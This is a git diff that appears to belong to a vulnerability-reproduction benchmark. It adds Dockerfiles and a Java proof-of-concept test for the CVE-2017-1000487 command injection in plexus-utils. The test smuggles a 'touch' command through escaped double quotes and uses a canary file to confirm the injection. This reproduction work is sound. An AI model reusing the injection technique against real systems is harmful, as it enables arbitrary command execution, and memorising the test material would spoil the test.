diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 0000000..08d0865
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/codehaus-plexus__plexus-utils_CVE-2017-1000487_3.0.15 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 0000000..8b13789
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..64cf6ac
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,24 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/codehaus-plexus__plexus-utils_CVE-2017-1000487_3.0.15 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Compile the test class
+RUN mkdir -p target/test-classes
+RUN javac -cp target/classes:target/test-classes src/test/java/org/codehaus/plexus/util/cli/test/CommandInjectionTest.java -d target/test-classes
+
+# Run the test
+CMD ["java", "-cp", "target/classes:target/test-classes", "org.codehaus.plexus.util.cli.test.CommandInjectionTest"]
diff --git a/src/test/java/org/codehaus/plexus/util/cli/test/CommandInjectionTest.java b/src/test/java/org/codehaus/plexus/util/cli/test/CommandInjectionTest.java
new file mode 100644
index 0000000..2c7083e
--- /dev/null
+++ b/src/test/java/org/codehaus/plexus/util/cli/test/CommandInjectionTest.java
@@ -0,0 +1,109 @@
+package org.codehaus.plexus.util.cli.test;
+
+import org.codehaus.plexus.util.cli.CommandLineUtils;
+import org.codehaus.plexus.util.cli.Commandline;
+import org.codehaus.plexus.util.cli.StreamConsumer;
+import java.io.File;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+/**
+ * Test case for CVE-2017-1000487 - OS Command Injection in Plexus-utils
+ * The vulnerability is in the double quote handling in the translateCommandline method
+ * 
+ * This test demonstrates that the vulnerability exists by exploiting the improper handling
+ * of escaped double quotes within double-quoted strings, which allows for command injection.
+ * 
+ * The test will exit with code 1 if the vulnerability exists, and code 0 if it does not exist.
+ */
+public class CommandInjectionTest {
+
+    private static final String CANARY_FILENAME = "command_injection_test.txt";
+    private static final String CANARY_CONTENT = "This file was created by a command injection";
+
+    public static void main(String[] args) {
+        try {
+            // Delete the canary file if it exists from a previous run
+            File canaryFile = new File(CANARY_FILENAME);
+            if (canaryFile.exists()) {
+                canaryFile.delete();
+            }
+
+            // Test for the vulnerability
+            boolean isVulnerable = testCommandInjection();
+            
+            // Exit with code 1 if vulnerable, 0 if not vulnerable
+            System.exit(isVulnerable ? 1 : 0);
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.exit(2); // Exit with error code for unexpected exceptions
+        }
+    }
+
+    private static boolean testCommandInjection() throws Exception {
+        System.out.println("Testing for command injection vulnerability in Plexus-utils...");
+        
+        // The vulnerability is in how escaped characters within double quotes are handled
+        // This command should be interpreted as a single argument to sh -c, but due to the vulnerability,
+        // the escaped quotes are not properly handled, allowing command injection
+        String maliciousCommand = "sh -c \"echo \\\"hello\\\" && touch " + CANARY_FILENAME + "\"";
+        
+        System.out.println("Executing command: " + maliciousCommand);
+        
+        // Print how the command is actually parsed
+        try {
+            String[] parsed = CommandLineUtils.translateCommandline(maliciousCommand);
+            System.out.println("Parsed command arguments:");
+            for (int i = 0; i < parsed.length; i++) {
+                System.out.println("  [" + i + "] '" + parsed[i] + "'");
+            }
+        } catch (Exception e) {
+            System.out.println("Error parsing command: " + e.getMessage());
+            return false;
+        }
+        
+        // Create a command line with the malicious input
+        Commandline cl = new Commandline(maliciousCommand);
+        
+        // Set up a consumer to capture output
+        final StringBuilder outputBuffer = new StringBuilder();
+        StreamConsumer output = new StreamConsumer() {
+            public void consumeLine(String line) {
+                outputBuffer.append(line).append(System.lineSeparator());
+                System.out.println("Output: " + line);
+            }
+        };
+        
+        // Execute the command
+        try {
+            CommandLineUtils.executeCommandLine(cl, output, output);
+        } catch (Exception e) {
+            System.out.println("Error executing command: " + e.getMessage());
+            e.printStackTrace();
+            return false;
+        }
+        
+        // Check if the canary file was created (indicating command injection worked)
+        boolean canaryExists = new File(CANARY_FILENAME).exists();
+        System.out.println("Canary file exists: " + canaryExists);
+        
+        if (canaryExists) {
+            System.out.println("VULNERABLE: Command injection succeeded!");
+            
+            // Write content to the canary file to prove we have write access
+            try {
+                Files.write(Paths.get(CANARY_FILENAME), CANARY_CONTENT.getBytes());
+                String fileContent = new String(Files.readAllBytes(Paths.get(CANARY_FILENAME)));
+                System.out.println("Canary file content: " + fileContent);
+            } catch (IOException e) {
+                System.out.println("Error writing to canary file: " + e.getMessage());
+            }
+            
+            return true;
+        } else {
+            System.out.println("NOT VULNERABLE: Command injection failed.");
+            return false;
+        }
+    }
+}
